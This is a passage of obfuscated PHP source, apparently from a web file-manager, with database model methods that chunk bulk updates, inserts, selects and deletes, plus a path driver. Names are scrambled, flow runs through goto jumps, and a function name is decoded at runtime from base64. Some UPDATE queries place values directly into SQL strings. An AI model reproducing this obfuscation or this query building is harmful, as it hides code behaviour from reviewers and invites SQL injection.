call_user_func_array($aÕØº°Œ¸‹, $B£òŞ“œŒ×); } else { $FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’] = call_user_func_array(array(&$this, $aÕØº°Œ¸‹), $B£òŞ“œŒ×); } break; case $A¼íÊæ½ó•[276]: $FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’] = $FÈ£Ú«é§Ñ[$eÓ“óĞ×™—[1]]; break; case $A¼íÊæ½ó•[297]: if (isset($FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’]) && !is_string($FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’])) { $FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’] = json_encode_force($FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’]); } break; case $A¼íÊæ½ó•[326]: if ($FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’] === $A¼íÊæ½ó•[43]) { unset($FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’]); } break; case $A¼íÊæ½ó•[327]: $FÈ£Ú«é§Ñ[$Fø”ÜĞÄˆ’] = $eÓ“óĞ×™—[1]; default: break; } } if ($cÆù™„Ğ¬Š == $A¼íÊæ½ó•[360]) { $ağëË†Îè = strtolower($this->db->getDbType()); if (strpos($ağëË†Îè, $A¼íÊæ½ó•[19]) !== 0) { return; } $DÓœÄ–çĞ‰ = $this->field(!0)->fields; $F’ÚÛĞÉ = $DÓœÄ–çĞ‰[$A¼íÊæ½ó•[255]]; if (isset($DÓœÄ–çĞ‰[$A¼íÊæ½ó•[254]])) { unset($F’ÚÛĞÉ[$DÓœÄ–çĞ‰[$A¼íÊæ½ó•[254]]]); } foreach ($F’ÚÛĞÉ as $C£ƒÄ›Ñœ‡ => $cÆù™„Ğ¬Š) { if (!isset($FÈ£Ú«é§Ñ[$C£ƒÄ›Ñœ‡])) { $FÈ£Ú«é§Ñ[$C£ƒÄ›Ñœ‡] = $A¼íÊæ½ó•[43]; } } } } private function dataAfterFilter(&$bõ¥Ÿ¦²Î”) { $bêÓŒïÑœ =& $_SERVER[±á õÁ]; foreach ($this->dataAuto as $f´ãàÍÀ«) { $CĞî‘Ÿ‚â = $f´ãàÍÀ«[0]; if (!in_array($bêÓŒïÑœ[362], explode($bêÓŒïÑœ[57], $f´ãàÍÀ«[2]))) { continue; } if (!isset($bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â])) { continue; } switch (trim($f´ãàÍÀ«[3])) { case $bêÓŒïÑœ[324]: case $bêÓŒïÑœ[325]: $DÃœÄ®¹Îõ = isset($f´ãàÍÀ«[4]) ? (array) $f´ãàÍÀ«[4] : array(); array_unshift($DÃœÄ®¹Îõ, $bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â]); if ($bêÓŒïÑœ[324] == $f´ãàÍÀ«[3]) { $bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â] = call_user_func_array($f´ãàÍÀ«[1], $DÃœÄ®¹Îõ); } else { $bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â] = call_user_func_array(array(&$this, $f´ãàÍÀ«[1]), $DÃœÄ®¹Îõ); } break; case $bêÓŒïÑœ[276]: $bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â] = $bõ¥Ÿ¦²Î”[$f´ãàÍÀ«[1]]; break; case $bêÓŒïÑœ[297]: $CÓ•¯¶ò·– = $bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â]; $bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â] = json_decode($CÓ•¯¶ò·–, !0); if (is_null($bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â])) { $bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â] = $CÓ•¯¶ò·–; } break; case $bêÓŒïÑœ[326]: if ($bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â] === $bêÓŒïÑœ[43]) { unset($bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â]); } break; case $bêÓŒïÑœ[327]: $bõ¥Ÿ¦²Î”[$CĞî‘Ÿ‚â] = $f´ãàÍÀ«[1]; default: break; } } } public function saveAll($AçÌ‹Êç‰’) { goto fÙ¾ƒéƒÒ; Fë£×¢äº: $AçÌ‹Êç‰’ = is_array($AçÌ‹Êç‰’) ? $AçÌ‹Êç‰’ : array(); $FˆìÔø×ï‰ = $Eù«Ê‹½ğõ[18]; $FäöÄÌÜµï = 0; goto d‚í“‚¹·´; fÙ¾ƒéƒÒ: $Eù«Ê‹½ğõ =& $_SERVER[±á õÁ]; $F²‹¿‘²³ˆ = $this->tablePrefix . $this->tableName; $fì²Ù¬¬ö = self::SQL_WHERE_IN_CHUNK; goto Fë£×¢äº; d‚í“‚¹·´: $bĞ¨…©«Ó = array(); $dõë½‘‘“ï = count($AçÌ‹Êç‰’); for ($e‡¯¼ÚóÑ = 0; $e‡¯¼ÚóÑ < $dõë½‘‘“ï; $e‡¯¼ÚóÑ++) { $b·ù»Ë˜×Œ = $AçÌ‹Êç‰’[$e‡¯¼ÚóÑ]; if (!is_array($b·ù»Ë˜×Œ) || count($b·ù»Ë˜×Œ) != 4) { continue; } $BÓ•ìñÑÅ = "\x55\120\104\101\124\x45\40\140{$F²‹¿‘²³ˆ}\140\40\123\x45\x54\40{$b·ù»Ë˜×Œ[2]}\x20\75\x20\x43\101\123\x45\40{$b·ù»Ë˜×Œ[0]}\40\12"; if ($FäöÄÌÜµï == 0) { $FˆìÔø×ï‰ = $BÓ•ìñÑÅ; } $bĞ¨…©«Ó[] = $Eù«Ê‹½ğõ[123] . $b·ù»Ë˜×Œ[1] . $Eù«Ê‹½ğõ[123]; $FäöÄÌÜµï++; $FˆìÔø×ï‰ .= "\40\x57\x48\x45\x4e\40\x27{$b·ù»Ë˜×Œ[1]}\x27\x20\x54\x48\105\116\x20\x27{$b·ù»Ë˜×Œ[3]}\47\40\xa"; if ($FäöÄÌÜµï == $fì²Ù¬¬ö || $e‡¯¼ÚóÑ == $dõë½‘‘“ï - 1) { goto DñÖõ¹òÓİ; DñÖõ¹òÓİ: $aßÊã›ëå = implode($Eù«Ê‹½ğõ[57], $bĞ¨…©«Ó); $FˆìÔø×ï‰ .= "\40\x45\116\104\x20\40\127\110\105\122\x45\40{$b·ù»Ë˜×Œ[0]}\x20\111\x4e\x20\50{$aßÊã›ëå}\51\x20"; $this->execute($FˆìÔø×ï‰); goto a²ğ©À‘îÂ; a²ğ©À‘îÂ: $FäöÄÌÜµï = 0; $FˆìÔø×ï‰ = $BÓ•ìñÑÅ; $this->chunkEventCheck(count($bĞ¨…©«Ó)); goto d™‰‚İ²É£; d™‰‚İ²É£: $bĞ¨…©«Ó = array(); goto bñŞÅ”·Œª; bñŞÅ”·Œª: } } goto a–¶½­¡; a–¶½­¡: $this->chunkEventSet(); goto fÏ¢‹ì†¦Ò; fÏ¢‹ì†¦Ò: } public function saveAllEach($E±…ëå›) { $Fœ¹Æ¥¹˜³ =& $_SERVER[±á õÁ]; $B„…¿§ÔÎî = $this->tablePrefix . $this->tableName; foreach ($E±…ëå› as $A‡Â·„ÎÅî) { if (!is_array($A‡Â·„ÎÅî) || count($A‡Â·„ÎÅî) != 4) { continue; } $Dö»¥Î‰ÉŒ = $A‡Â·„ÎÅî[0] . $Fœ¹Æ¥¹˜³[377] . $A‡Â·„ÎÅî[1] . $Fœ¹Æ¥¹˜³[123]; $Dàá¸ï³Ï = $A‡Â·„ÎÅî[2] . $Fœ¹Æ¥¹˜³[377] . $A‡Â·„ÎÅî[3] . $Fœ¹Æ¥¹˜³[123]; $bŒßÀîô» = "\x75\160\144\x61\164\145\40{$B„…¿§ÔÎî}\40\163\x65\164\40{$Dàá¸ï³Ï}\x20\167\x68\145\x72\x65\40{$Dö»¥Î‰ÉŒ}\x3b"; $this->execute($bŒßÀîô»); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Eİ²®Şƒäº = false, $a·œƒƒøˆí = false) { $this->_chunkEvent = $Eİ²®Şƒäº; $this->_chunkEventParam = $a·œƒƒøˆí; } private function chunkEventCheck($A‘×ÎÇê¥¹) { if (!$this->_chunkEvent) { return; } $eƒ‚á‚’íª = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $eƒ‚á‚’íª[$_SERVER[±á õÁ][378]] = $A‘×ÎÇê¥¹; Hook::trigger($this->_chunkEvent, $eƒ‚á‚’íª); } public function addAll($E–‰â´Öğ, $f¤˜ô‡²µ¢ = array(), $f±öãÚ¾‰ª = false) { goto c¸ÖãĞ™÷µ; c¸ÖãĞ™÷µ: $cÙßÍ¨ÁÄ— =& $_SERVER[±á õÁ]; ignore_timeout(); $Eø³Ï½Úº° = self::SQL_WHERE_IN_CHUNK; goto CÔ›¦ÂÈ¸§; D Ï£åÍù: if (method_exists($this->db, $cÙßÍ¨ÁÄ—[275])) { for ($cªËÔ¡‰ = 0; $cªËÔ¡‰ < count($E–‰â´Öğ); $cªËÔ¡‰ += $Eø³Ï½Úº°) { $EÇêá¼‘ÇÄ = array_slice($E–‰â´Öğ, $cªËÔ¡‰, $Eø³Ï½Úº°); if (!is_array($EÇêá¼‘ÇÄ) || count($EÇêá¼‘ÇÄ) == 0) { break; } $E„³±¬¸ˆ¶ = $this->db->insertAll($EÇêá¼‘ÇÄ, $f¤˜ô‡²µ¢, $f±öãÚ¾‰ª); $this->chunkEventCheck(count($EÇêá¼‘ÇÄ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($E–‰â´Öğ as $a¾¦¡²‚•ˆ => $C®ÌÂ•ÕÛä) { $E„³±¬¸ˆ¶ = $this->db->insert($C®ÌÂ•ÕÛä, $f¤˜ô‡²µ¢, $f±öãÚ¾‰ª); } $this->commit(); } if (!1 !== $E„³±¬¸ˆ¶) { $bÍ Á—ô× = $this->getLastInsID(); if ($bÍ Á—ô×) { return $bÍ Á—ô×; } } return $E„³±¬¸ˆ¶; goto bÊ í¥‘“ƒ; CÔ›¦ÂÈ¸§: if (empty($E–‰â´Öğ)) { $this->error = think_lang($cÙßÍ¨ÁÄ—[274]); return !1; } $f¤˜ô‡²µ¢ = $this->_parseOptions($f¤˜ô‡²µ¢); foreach ($E–‰â´Öğ as $a¾¦¡²‚•ˆ => $C®ÌÂ•ÕÛä) { $E–‰â´Öğ[$a¾¦¡²‚•ˆ] = $this->_facade($C®ÌÂ•ÕÛä); $this->_beforeInsert($E–‰â´Öğ[$a¾¦¡²‚•ˆ], $f¤˜ô‡²µ¢); } goto D Ï£åÍù; bÊ í¥‘“ƒ: } public function save($F‡·ÁØ·àí = '', $fôÀ¶¡¿Œ÷ = array()) { goto dĞš±Şœ†; D¼Úå«¶ù: $cæŞ©ºòÂ¢ = $d¶•¤ÇÙ´µ[$dàÑÎ’§˜®[278]][$AĞ‹»Éƒªµ][1]; $cæŞ©ºòÂ¢ = is_array($cæŞ©ºòÂ¢) ? $cæŞ©ºòÂ¢ : array(); $Dñ×â–‡ = count($cæŞ©ºòÂ¢); goto d©­ù®¦Î…; d©­ù®¦Î…: for ($Fªà«…†åÄ = 0; $Fªà«…†åÄ < $Dñ×â–‡; $Fªà«…†åÄ += $eœ¾—¸ƒö») { $B¸¿ ¼”ê‰ = array_slice($cæŞ©ºòÂ¢, $Fªà«…†åÄ, $eœ¾—¸ƒö»); if (!is_array($B¸¿ ¼”ê‰) || count($B¸¿ ¼”ê‰) == 0) { break; } $d¶•¤ÇÙ´µ[$dàÑÎ’§˜®[278]][$AĞ‹»Éƒªµ][1] = $B¸¿ ¼”ê‰; $this->optionsValue($d¶•¤ÇÙ´µ); $E¬¦ç­ÜÉÏ += parent::save($F‡·ÁØ·àí, $fôÀ¶¡¿Œ÷); $this->chunkEventCheck(count($B¸¿ ¼”ê‰)); } $this->chunkEventSet(); return $E¬¦ç­ÜÉÏ; goto bË„•®£¦Ù; dĞš±Şœ†: $dàÑÎ’§˜® =& $_SERVER[±á õÁ]; $eœ¾—¸ƒö» = self::SQL_WHERE_IN_CHUNK; $d¶•¤ÇÙ´µ = $this->optionsValue(); goto C“¥È°›„¶; C“¥È°›„¶: $AĞ‹»Éƒªµ = $this->findWhereField($d¶•¤ÇÙ´µ); if (!$AĞ‹»Éƒªµ) { return parent::save($F‡·ÁØ·àí, $fôÀ¶¡¿Œ÷); } $E¬¦ç­ÜÉÏ = 0; goto D¼Úå«¶ù; bË„•®£¦Ù: } public function add($D³æƒñÒÛİ = '', $bĞïèÛÕçà = array(), $f‡É‘ÎæÈä = false) { if ($this->addTaskStatus && is_array($D³æƒñÒÛİ)) { $this->addTaskData[] = $D³æƒñÒÛİ; return; } return parent::add($D³æƒñÒÛİ, $bĞïèÛÕçà, $f‡É‘ÎæÈä); } public function parseWhereLike($Eàƒ¥£ÆÇ·, $CÈá²¡ƒ÷ë = '', $fÇ”†„¨£œ = false, &$d®¹¡’ğãò = false) { goto bê¶´ğ¹Œ; bê¶´ğ¹Œ: $aâÊÙ¿”±³ =& $_SERVER[±á õÁ]; $BÏÚ³™µÅ± = $GLOBALS[$aâÊÙ¿”±³[6]][$aâÊÙ¿”±³[379]]; if (!$BÏÚ³™µÅ±[$aâÊÙ¿”±³[380]]) { return $Eàƒ¥£ÆÇ·; } goto Cğ¬ô“Â¸Ø; CÊ ©‹·ä¿: foreach ($Eàƒ¥£ÆÇ· as $a”¿Ğ‹İß => $cî°ÛÙ‹ºÛ) { if (is_array($cî°ÛÙ‹ºÛ) && count($cî°ÛÙ‹ºÛ) == 2 && $cî°ÛÙ‹ºÛ[0] == $aâÊÙ¿”±³[381] && is_string($cî°ÛÙ‹ºÛ[1]) && substr($cî°ÛÙ‹ºÛ[1], 0, 1) == $aâÊÙ¿”±³[382] && substr($cî°ÛÙ‹ºÛ[1], strlen($cî°ÛÙ‹ºÛ[1]) - 1, 1) == $aâÊÙ¿”±³[382]) { goto DŞ¹£·‘¯¥; FÁ‘’ˆÛÃà: $f‰áÆØ¨”[$D¨µ¸îª¨] = $aâÊÙ¿”±³[385] . $dØ—­à•©¡ . $aâÊÙ¿”±³[386] . $bÔˆàÅ§Ê¯ . $aâÊÙ¿”±³[387]; $D¨µ¸îª¨++; continue; goto f¨æ©¬ĞŒ—; B“ÖÎĞ¯¶: $bÔˆàÅ§Ê¯ = $this->db->escapeString($bÔˆàÅ§Ê¯); if (!strpos($dØ—­à•©¡, $aâÊÙ¿”±³[101])) { $dØ—­à•©¡ = $aâÊÙ¿”±³[383] . $dØ—­à•©¡ . $aâÊÙ¿”±³[383]; } if ($BÏÚ³™µÅ±[$aâÊÙ¿”±³[384]]) { $bÔˆàÅ§Ê¯ = $aâÊÙ¿”±³[123] . $bÔˆàÅ§Ê¯ . $aâÊÙ¿”±³[123]; } goto FÁ‘’ˆÛÃà; DŞ¹£·‘¯¥: $d®¹¡’ğãò = !0; $dØ—­à•©¡ = is_string($a”¿Ğ‹İß) ? $a”¿Ğ‹İß : $CÈá²¡ƒ÷ë; $bÔˆàÅ§Ê¯ = substr($cî°ÛÙ‹ºÛ[1], 1, strlen($cî°ÛÙ‹ºÛ[1]) - 2); goto B“ÖÎĞ¯¶; f¨æ©¬ĞŒ—: } if (is_array($cî°ÛÙ‹ºÛ)) { $CÈá²¡ƒ÷ë = is_string($a”¿Ğ‹İß) ? $a”¿Ğ‹İß : $CÈá²¡ƒ÷ë; $cî°ÛÙ‹ºÛ = $this->parseWhereLike($cî°ÛÙ‹ºÛ, $CÈá²¡ƒ÷ë, !0, $d®¹¡’ğãò); } if (is_numeric($a”¿Ğ‹İß)) { $f‰áÆØ¨”[$D¨µ¸îª¨] = $cî°ÛÙ‹ºÛ; $D¨µ¸îª¨++; } else { $f‰áÆØ¨”[$a”¿Ğ‹İß] = $cî°ÛÙ‹ºÛ; } } if ($d®¹¡’ğãò && !$fÇ”†„¨£œ) { trace_log(array($f‰áÆØ¨”, $Eàƒ¥£ÆÇ·), $aâÊÙ¿”±³[278]); } return $f‰áÆØ¨”; goto eŸ…ã”œñ; Cğ¬ô“Â¸Ø: if (!is_array($Eàƒ¥£ÆÇ·)) { return $Eàƒ¥£ÆÇ·; } $f‰áÆØ¨” = array(); $D¨µ¸îª¨ = 0; goto CÊ ©‹·ä¿; eŸ…ã”œñ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($eÌ˜Ê‰ÜõÈ = array()) { goto B¤õ·œ™÷; A›Ê»‹¼èˆ: return $aƒ ãŒåŞ¦; goto Dá½˜Ç¿¯Ì; C·Ä‡ğğ¤…: $eÔôÏ£³ØŠ = is_array($eÔôÏ£³ØŠ) ? $eÔôÏ£³ØŠ : array(); $aƒ ãŒåŞ¦ = null; for ($f¢Ü’Š¦Ä’ = 0; $f¢Ü’Š¦Ä’ < count($eÔôÏ£³ØŠ); $f¢Ü’Š¦Ä’ += $BÉ¤Åä‡Ø¡) { $aÜ¾©«È»Ú = array_slice($eÔôÏ£³ØŠ, $f¢Ü’Š¦Ä’, $BÉ¤Åä‡Ø¡); if (!is_array($aÜ¾©«È»Ú) || count($aÜ¾©«È»Ú) == 0) { break; } $f¨£™–šÉÚ[$a…˜õä²¶£[278]][$CŞ¯Ö¿·âã][1] = $aÜ¾©«È»Ú; $this->optionsValue($f¨£™–šÉÚ); $Bª¶æ¤ãæ = parent::select($eÌ˜Ê‰ÜõÈ); if (!$Bª¶æ¤ãæ) { continue; } if (is_null($aƒ ãŒåŞ¦)) { $aƒ ãŒåŞ¦ = array(); } $aƒ ãŒåŞ¦ = array_merge($aƒ ãŒåŞ¦, $Bª¶æ¤ãæ); } goto A›Ê»‹¼èˆ; C…É±Û–: $CŞ¯Ö¿·âã = $this->findWhereField($f¨£™–šÉÚ); if (!$CŞ¯Ö¿·âã || isset($f¨£™–šÉÚ[$a…˜õä²¶£[295]]) || isset($f¨£™–šÉÚ[$a…˜õä²¶£[356]])) { return parent::select($eÌ˜Ê‰ÜõÈ); } $eÔôÏ£³ØŠ = $f¨£™–šÉÚ[$a…˜õä²¶£[278]][$CŞ¯Ö¿·âã][1]; goto C·Ä‡ğğ¤…; B¤õ·œ™÷: $a…˜õä²¶£ =& $_SERVER[±á õÁ]; $BÉ¤Åä‡Ø¡ = self::SQL_WHERE_IN_CHUNK; $f¨£™–šÉÚ = $this->optionsValue(); goto C…É±Û–; Dá½˜Ç¿¯Ì: } public function delete($d›Ÿù¶¼‡ = array()) { goto EİÓ£¸ Ò; bÓÆäòš‘Ø: return $bùËÌö‚»; goto b¹¿×®«®¹; Bó†Ô²‘ƒ«: $c¿Œë­÷í = $c¥Í¦¥Äõ¿[$eÉ£ºó¸²[278]][$b…„÷®àáƒ][1]; $c¿Œë­÷í = is_array($c¿Œë­÷í) ? $c¿Œë­÷í : array(); for ($B˜©ëÇö÷Í = 0; $B˜©ëÇö÷Í < count($c¿Œë­÷í); $B˜©ëÇö÷Í += $aÁå¢¢Œ) { $aÙÊñŠÊ¹ = array_slice($c¿Œë­÷í, $B˜©ëÇö÷Í, $aÁå¢¢Œ); if (!is_array($aÙÊñŠÊ¹) || count($aÙÊñŠÊ¹) == 0) { break; } $c¥Í¦¥Äõ¿[$eÉ£ºó¸²[278]][$b…„÷®àáƒ][1] = $aÙÊñŠÊ¹; $this->optionsValue($c¥Í¦¥Äõ¿); $bùËÌö‚» += parent::delete($d›Ÿù¶¼‡); } goto bÓÆäòš‘Ø; AÊ¸ŞöÊìí: $b…„÷®àáƒ = $this->findWhereField($c¥Í¦¥Äõ¿); if (!$b…„÷®àáƒ) { return parent::delete($d›Ÿù¶¼‡); } $bùËÌö‚» = 0; goto Bó†Ô²‘ƒ«; EİÓ£¸ Ò: $eÉ£ºó¸² =& $_SERVER[±á õÁ]; $aÁå¢¢Œ = self::SQL_WHERE_IN_CHUNK; $c¥Í¦¥Äõ¿ = $this->optionsValue(); goto AÊ¸ŞöÊìí; b¹¿×®«®¹: } private function findWhereField($B‡’°Ó†Â…) { $b”š„ö‹ä =& $_SERVER[±á õÁ]; $cÜ–®ã†Ã = self::SQL_WHERE_IN_CHUNK; if (!is_array($B‡’°Ó†Â…) || !is_array($B‡’°Ó†Â…[$b”š„ö‹ä[278]])) { return !1; } foreach ($B‡’°Ó†Â…[$b”š„ö‹ä[278]] as $e‹²Øğö¨Ò => $E»´¢»ÁÖœ) { if (is_array($E»´¢»ÁÖœ) && isset($E»´¢»ÁÖœ[0]) && is_string($E»´¢»ÁÖœ[0]) && strtolower($E»´¢»ÁÖœ[0]) == $b”š„ö‹ä[7] && is_array($E»´¢»ÁÖœ[1]) && count($E»´¢»ÁÖœ[1]) > $cÜ–®ã†Ã) { ignore_timeout(); return $e‹²Øğö¨Ò; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\x65\155\117\x70\164\151\157\x6e"; public $field = array(); public function listData($e˜Äé‡Ú‘ = false, $a‰œÓµ™‰ = "\155\157\144\151\x66\x79\x54\x69\155\145", $fÎ¢¸Ÿ‡«İ = false) { $dÉíÅæ‘¤ë = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$dÉíÅæ‘¤ë) { return $e˜Äé‡Ú‘ ? null : array(); } if (!$e˜Äé‡Ú‘) { $dÉíÅæ‘¤ë = array_filter(array_values($dÉíÅæ‘¤ë)); return array_sort_by($dÉíÅæ‘¤ë, $a‰œÓµ™‰, $fÎ¢¸Ÿ‡«İ); } return $dÉíÅæ‘¤ë[$_SERVER[±á õÁ][388] . $e˜Äé‡Ú‘]; } public function insert($Fœ¶¢»é«“) { goto fèà›ÊÈÇè; fèà›ÊÈÇè: $cŞƒ«•Ä =& $_SERVER[±á õÁ]; $Fœ¶¢»é«“ = array_field_key($Fœ¶¢»é«“, $this->field); $B‚áµœ¢Â = Model($this->modelType)->get($cŞƒ«•Ä[389], $this->optionType . $cŞƒ«•Ä[390]); goto Cöò‡Ü„Í; E’¶§Úª„ò: return $B‚áµœ¢Â; goto fÑ•ÌšáîÄ; eÙ¿˜®ÉÑƒ: $Fœ¶¢»é«“[$cŞƒ«•Ä[117]] = time(); Model($this->modelType)->set($cŞƒ«•Ä[389], $B‚áµœ¢Â, $this->optionType . $cŞƒ«•Ä[390]); Model($this->modelType)->set($cŞƒ«•Ä[388] . $B‚áµœ¢Â, $Fœ¶¢»é«“, $this->optionType); goto E’¶§Úª„ò; Cöò‡Ü„Í: $B‚áµœ¢Â = $B‚áµœ¢Â ? $B‚áµœ¢Â : 0; $Fœ¶¢»é«“[$cŞƒ«•Ä[391]] = ++$B‚áµœ¢Â; $Fœ¶¢»é«“[$cŞƒ«•Ä[200]] = time(); goto eÙ¿˜®ÉÑƒ; fÑ•ÌšáîÄ: } public function update($b­íñ‘­·µ, $e‘½ˆ­î«) { goto a²å¸ùÖÛ; aªãÏŞ¦ë´: return Model($this->modelType)->set($Câ®‰Ğà‹Ï[388] . $b­íñ‘­·µ, $e‘½ˆ­î«, $this->optionType); goto A¬”¦Ñ¯¨; C´¿ÑÕŠ·è: if (!$b™‹ÇÊ„) { return !1; } $e‘½ˆ­î« = array_merge($b™‹ÇÊ„, $e‘½ˆ­î«); $e‘½ˆ­î«[$Câ®‰Ğà‹Ï[117]] = time(); goto aªãÏŞ¦ë´; a²å¸ùÖÛ: $Câ®‰Ğà‹Ï =& $_SERVER[±á õÁ]; $e‘½ˆ­î« = array_field_key($e‘½ˆ­î«, $this->field); $b™‹ÇÊ„ = $this->listData($b­íñ‘­·µ); goto C´¿ÑÕŠ·è; A¬”¦Ñ¯¨: } public function remove($f¬»ß¾©«) { return Model($this->modelType)->remove($_SERVER[±á õÁ][388] . $f¬»ß¾©«, $this->optionType); } public function clear() { $b„¤×Û´óÜ =& $_SERVER[±á õÁ]; Model($this->modelType)->remove($b„¤×Û´óÜ[389], $this->optionType . $b„¤×Û´óÜ[390]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($D¢¢È ¡¡•, $B½¨šŒ·äù) { if (!$B½¨šŒ·äù) { return !1; } $B¦Ğæº”·Ê = $this->listData(); $B¦Ğæº”·Ê = array_to_keyvalue($B¦Ğæº”·Ê, $D¢¢È ¡¡•); return isset($B¦Ğæº”·Ê[$B½¨šŒ·äù]) ? $B¦Ğæº”·Ê[$B½¨šŒ·äù] : !1; } public function findByName($fªÃï¬µìï) { return $this->findByKey($_SERVER[±á õÁ][38], $fªÃï¬µìï); } protected function resetData($CïÙÉ«¢³) { $c¡¡í¨Ú =& $_SERVER[±á õÁ]; $CïÙÉ«¢³ = is_array($CïÙÉ«¢³) ? $CïÙÉ«¢³ : array(); $E¤µºÓ¦ˆâ = array(); for ($d²´±ˆ­ñ‰ = 0; $d²´±ˆ­ñ‰ < count($CïÙÉ«¢³); $d²´±ˆ­ñ‰++) { $E¤µºÓ¦ˆâ[$c¡¡í¨Ú[388] . $CïÙÉ«¢³[$d²´±ˆ­ñ‰][$c¡¡í¨Ú[391]]] = $CïÙÉ«¢³[$d²´±ˆ­ñ‰]; } return Model($this->modelType)->set($E¤µºÓ¦ˆâ, !1, $this->optionType); } private function getAutoName($déçÏì¨å’) { $A•³ÈŸ•Ò = array_to_keyvalue($this->listData(), $_SERVER[±á õÁ][38]); if (!$A•³ÈŸ•Ò || !isset($A•³ÈŸ•Ò[$déçÏì¨å’])) { return $déçÏì¨å’; } for ($A‚Ñ°Ä÷áÀ = 1; $A‚Ñ°Ä÷áÀ < count($A•³ÈŸ•Ò); $A‚Ñ°Ä÷áÀ++) { $Cïì®›¨¾Š = $déçÏì¨å’ . "\x28{$A‚Ñ°Ä÷áÀ}\51"; if (!isset($A•³ÈŸ•Ò[$Cïì®›¨¾Š])) { return $Cïì®›¨¾Š; } } return $Cïì®›¨¾Š; } } goto a°ê‚«‹; eåøŠÂŸ¡‚: define($_SERVER[±á õÁ][241], 1); define($_SERVER[±á õÁ][242], 2); define($_SERVER[±á õÁ][243], 3); goto fˆÅÏ’¬íÍ; d‡Ÿ¹£áœ¹: $F‚ÏŠ„Š’º = strrev(base64_decode($_SERVER[¢ğ´ ][0])); function binCheckNeq($Cçì¹â¿±é, $dÖÓÄÖÜà) { return $Cçì¹â¿±é != $dÖÓÄÖÜà; } $_SERVER[$_SERVER[¢ğ´ ][1]] = $F‚ÏŠ„Š’º($_SERVER[$_SERVER[¢ğ´ ][2]]); goto A³î¢»¥Ä; E»ª‰‘—‡: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($DÑ­ğ¸ƒ«) { $this->pathParse = $DÑ­ğ¸ƒ«; $this->model = Model($_SERVER[±á õÁ][1138]); } public function getPath($eª…ÜÔœğ‡) { return trim($eª…ÜÔœğ‡, $_SERVER[±á õÁ][8]); } public function pathFather($A•©±³æ»¾) { $D„òÑ’Öñ = $this->parse($A•©±³æ»¾); $D„òÑ’Öñ = $this->infoSimple($A•©±³æ»¾); return $D„òÑ’Öñ ? $D„òÑ’Öñ[$_SERVER[±á õÁ][486]] : !1; } public function getPathName($f¼¹ØµÚ­ö) { $A‚‘’ÇÛ™ = $this->infoSimple($f¼¹ØµÚ­ö); return $A‚‘’ÇÛ™ ? $A‚‘’ÇÛ™[$_SERVER[±á õÁ][38]] : !1; } public function getPathOuter($F•ÔÊ¶Šƒ) { if (!$F•ÔÊ¶Šƒ) { return $F•ÔÊ¶Šƒ; } $dˆ¤è×ÉÔï = $this->parse($F•ÔÊ¶Šƒ); return KodIO::make($dˆ¤è×ÉÔï[$_SERVER[±á õÁ][391]]); } public function copyFolderFromIO($e±õ…Ó ˜ö, $a• †ŒÏ, $bñŒ©‡íÙÖ, $b×½ĞÆ³‘æ, $FÚµ¶ÔœÕï) { $b½Ò“†ŒĞ = $this->model->copyFolderFromIO($e±õ…Ó ˜ö, $a• †ŒÏ, $bñŒ©‡íÙÖ, $b×½ĞÆ³‘æ, $FÚµ¶ÔœÕï); return KodIO::make($b½Ò“†ŒĞ); } public function isParentOf($bƒò¥ğÜæ­, $FïÃ“®æ Ì) { return $this->model->isParentOf($bƒò¥ğÜæ­, $FïÃ“®æ Ì); } public function mkfile($eÄÀëôØµ·, $d¤‡Úê¢Ğ£ = '', $E‹Ÿß•‚Ò = REPEAT_RENAME) { $bÌ‘ÁÉ®ãÚ =& $_SERVER[±á õÁ]; $bÜóäˆğ¤ = $this->parse($eÄÀëôØµ·); $eÄÀëôØµ· = $bÜóäˆğ¤[$bÌ‘ÁÉ®ãÚ[391]]; for ($dÊŒÑµ‡‡Ô = 0; $dÊŒÑµ‡‡Ô < count($bÜóäˆğ¤[$bÌ‘ÁÉ®ãÚ[1139]]); $dÊŒÑµ‡‡Ô++) { $aæÙõ®ƒ¿ = $bÜóäˆğ¤[$bÌ‘ÁÉ®ãÚ[1139]][$dÊŒÑµ‡‡Ô]; if ($dÊŒÑµ‡‡Ô == count($bÜóäˆğ¤[$bÌ‘ÁÉ®ãÚ[1139]]) - 1) { $eÄÀëôØµ· = $this->model->mkfile($eÄÀëôØµ·, $aæÙõ®ƒ¿, $d¤‡Úê¢Ğ£, $E‹Ÿß•‚Ò); break; } $eÄÀëôØµ· = $this->model->mkdir($eÄÀëôØµ·, $aæÙõ®ƒ¿, REPEAT_SKIP); } return $this->getPathOuter($eÄÀëôØµ·); } public function mkdir($E¼İ”ãÚ…Ê, $eº½Œ¬Ó–¹ = REPEAT_SKIP) { $c¬à×âçŠ„ =& $_SERVER[±á õÁ]; $F…é·ƒØ·¦ = $this->parse($E¼İ”ãÚ…Ê); $E¼İ”ãÚ…Ê = 